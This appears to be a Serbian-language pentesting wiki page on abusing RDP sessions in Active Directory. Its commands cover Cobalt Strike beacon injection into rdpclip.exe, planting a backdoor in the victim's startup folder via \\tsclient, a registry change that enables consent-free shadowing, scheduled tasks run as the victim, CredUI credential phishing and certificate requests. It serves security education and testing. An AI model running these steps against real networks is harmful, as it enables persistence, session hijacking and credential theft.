# Zloupotreba RDP sesija

{{#include ../../banners/hacktricks-training.md}}

## RDP Process Injection

Ako **spoljna grupa** ima **RDP pristup** do bilo kog **računara** u trenutnom domenu, **napadač** bi mogao **kompromitovati taj računar i sačekati tog korisnika**.

Kada se taj korisnik poveže putem RDP-a, **napadač može pivotovati na sesiju tog korisnika** i zloupotrebiti njegove dozvole u eksternom domenu.
```bash
# Supposing the group "External Users" has RDP access in the current domain
## lets find where they could access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```
Pogledajte **other ways to steal sessions with other tools** [**na ovoj stranici.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## RDPInception

Ako se korisnik poveže putem **RDP into a machine** gde je **attacker** **waiting** za njega, attacker će moći da **inject a beacon in the RDP session of the user**, a ako je **victim mounted his drive** prilikom pristupa preko RDP-a, **attacker could access it**.

U tom slučaju jednostavno možete **compromise** the **victims** **original computer** by writing a **backdoor** in the **statup folder**.
```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
PID   PPID  Name                         Arch  Session     User
---   ----  ----                         ----  -------     -----
...
4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

Size     Type    Last Modified         Name
----     ----    -------------         ----
dir     02/10/2021 04:11:30   $Recycle.Bin
dir     02/10/2021 03:23:44   Boot
dir     02/20/2021 10:15:23   Config.Msi
dir     10/18/2016 01:59:39   Documents and Settings
[...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```
## Shadow RDP

Ако сте **local admin** на хосту где жртва већ има **active RDP session**, можда ћете моћи да **view/control that desktop without stealing the password or dumping LSASS**.

Ово зависи од политике **Remote Desktop Services shadowing** која је сачувана у:
```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```
Zanimljive vrednosti:

- `0`: Onemogućeno
- `1`: `EnableInputNotify` (kontrola, zahteva korisničko odobrenje)
- `2`: `EnableInputNoNotify` (kontrola, **nema korisničkog odobrenja**)
- `3`: `EnableNoInputNotify` (samo za pregled, zahteva korisničko odobrenje)
- `4`: `EnableNoInputNoNotify` (samo za pregled, **nema korisničkog odobrenja**)
```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```
Ovo je naročito korisno kada privilegovani korisnik povezan preko RDP ostavi otključan desktop, KeePass sesiju, MMC konzolu, browser sesiju ili admin shell otvoren.

## Zakazani zadaci kao prijavljeni korisnik

Ako ste **local admin** i ciljni korisnik je **trenutno prijavljen**, Task Scheduler može pokrenuti kod **kao taj korisnik bez njihove lozinke**.

Ovo pretvara postojeću prijavnu sesiju žrtve u izvršni primitiv:
```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```
Napomene:

- Ako korisnik **nije prijavljen**, Windows obično zahteva lozinku da bi kreirao task koji se pokreće kao taj korisnik.
- Ako korisnik **jе prijavljen**, task može ponovo upotrebiti postojeći logon kontekst.
- Ovo je praktičan način da se izvrše GUI akcije ili pokrenu binarni fajlovi unutar sesije žrtve bez diranja LSASS.

## Zloupotreba CredUI prompta iz sesije žrtve

Kada možete izvršavati **unutar interaktivnog desktopa žrtve** (na primer preko **Shadow RDP** ili **a scheduled task running as that user**), možete prikazati **pravi Windows credential prompt** koristeći CredUI API-je i pokupiti kredencijale koje žrtva unese.

Relevant APIs:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Tipični tok:

1. Pokrenuti binarni fajl u sesiji žrtve.
2. Prikazati prompt za autentifikaciju domena koji odgovara trenutnom brendiranju domena.
3. Raspakovati vraćeni auth buffer.
4. Validirati unete kredencijale i po želji nastaviti sa promptovanjem dok se ne unesu važeći kredencijali.

Ovo je korisno za **on-host phishing** jer prompt renderuju standardni Windows API-ji umesto lažnog HTML formulara.

## Zahtev PFX-a u kontekstu žrtve

Ista primitiva **scheduled-task-as-user** može se koristiti za zahtevanje **certificate/PFX as the logged-on victim**. Taj sertifikat se kasnije može koristiti za **AD authentication** kao taj korisnik, čime se potpuno izbegne krađa lozinke.

Visoki nivo toka:

1. Steći **local admin** na hostu gde je žrtva prijavljena.
2. Pokrenuti logiku za enrollment/export kao žrtva koristeći **scheduled task**.
3. Eksportovati dobijeni **PFX**.
4. Koristiti PFX za PKINIT / certificate-based AD authentication.

See the AD CS pages for follow-up abuse:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [SensePost - From flat networks to locked up domains with tiering models](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [Microsoft - Remote Desktop shadow](https://learn.microsoft.com/windows/win32/termserv/remote-desktop-shadow)
- [NetExec - Shadow RDP plugin PR #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [NetExec - schtask_as module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [NetExec - Request PFX via scheduled task PR #908](https://github.com/Pennyw0rth/NetExec/pull/908)

{{#include ../../banners/hacktricks-training.md}}
